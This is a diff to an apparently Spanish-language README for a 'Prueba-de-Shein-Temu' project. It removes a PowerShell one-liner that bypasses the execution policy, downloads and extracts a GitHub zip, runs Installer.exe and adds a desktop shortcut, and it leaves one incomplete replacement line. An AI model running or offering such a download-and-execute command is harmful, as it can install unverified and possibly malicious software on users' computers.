@@ -55,7 +55,7 @@ El sistema incluye un lanzador compilado que gestiona todo el entorno de forma a
 Ejecuta este comando en PowerShell para una configuración automática, descarga y preparación del entorno:
 
 ```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force; $d=[Environment]::GetFolderPath('Desktop'); $dest="$d\Prueba-de-Shein-Temu"; if(Test-Path $dest){Remove-Item $dest -Recurse -Force}; mkdir $dest|Out-Null; $z="$env:TEMP\repo.zip"; Invoke-WebRequest "https://github.com/Riutexu/Prueba-de-Shein-Temu/archive/refs/heads/main.zip" -OutFile $z; Expand-Archive $z -DestinationPath "$env:TEMP\tmp" -Force; $root=(Get-ChildItem "$env:TEMP\tmp" -Directory).FullName; Copy-Item "$root\*" -Destination $dest -Recurse -Force; Remove-Item $z, "$env:TEMP\tmp" -Recurse -Force; $exe="$dest\Installer.exe"; if(Test-Path $exe){ Start-Process $exe -WorkingDirectory $dest; $s=(New-Object -ComObject WScript.Shell).CreateShortcut("$d\PruebaSheinTemu.lnk"); $s.TargetPath=$exe; $s.WorkingDirectory=$dest; $s.Save(); Write-Host "Proceso finalizado" } else { Write-Error "El archivo Installer.exe no existe en la ruta $dest" }
+$destDir = Join-Path ([Environment]::GetFolderPath('Desktop')) "Prueba-de-Shein-Temu"
 
 ```
 
